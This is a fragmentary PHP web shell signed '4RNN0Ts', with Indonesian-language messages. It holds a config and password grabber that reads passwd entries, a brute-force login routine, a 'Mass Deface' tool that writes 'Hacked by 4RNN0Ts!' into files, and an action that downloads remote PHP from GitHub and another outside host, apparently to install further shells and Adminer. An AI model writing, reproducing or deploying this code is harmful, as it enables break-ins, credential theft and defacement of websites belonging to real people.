...
<meta name='author' content='4RNN0Ts'>
<meta charset="UTF-8">
<style type="text/css">
		body {
		    background: #000000;
...
echo "<center><font color='silver' siz='4px' face='Fredericka the Great'>[+] By @4RNN0Ts [+]</font></center><br/>";
...
$passwd=explode("\n",$passwd);
echo "<br><br><center><font face='Homenaje' color=Crimson size=2pt>Ngkosek Tungguk i yoo</center><br>";
...
echo '<b><font face="Homenaje" color="springgreen" size="3pt"><b>Selesai Bos Q, Monggo >></b> <a target="_blank" href="I-Conf">Hajar Config</a></font></b>';}
die();
}
/////// Cukup Sampai Disini ya Grabber :( ////////
		...
		elseif(isset($_GET['x']) && ($_GET['x'] == 'brute'))
			...
			if(isset($_POST['usernames']) && isset($_POST['passwords']))
			{
			    ...
			    echo "<hr><b>You Found <font color=red>$ok</font> By 4RNN0Ts</b>";
...
function sabun_massal($path,$namafile,$isi_script) {
	...
	<tr>
	<td colspan='3'><textarea class='justborder' name='script' style='width: 500px; height: 200px;'>Hacked by 4RNN0Ts!</textarea><br></td>
	</tr>
	<tr>
	<td colspan='3' align='center'><input class='justborder' type='submit' name='start' value='Mass Deface' style='width: 50%;'><br/></td>
			...
			<input class="justborder" type="text" name="password" size="25" value="auahgelap"></td></tr></table>
		...
		elseif(isset($_GET['x']) && ($_GET['x'] == 'fcrot'))
			{
				...
				if(isset($submit)) {
					...
					$files = file_get_contents("https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/sc0hsphere.php");
						...
						getfile("https://republicforensic.my.id/Repository/Adminer/adminer-4.8.0.php","adminer.php");
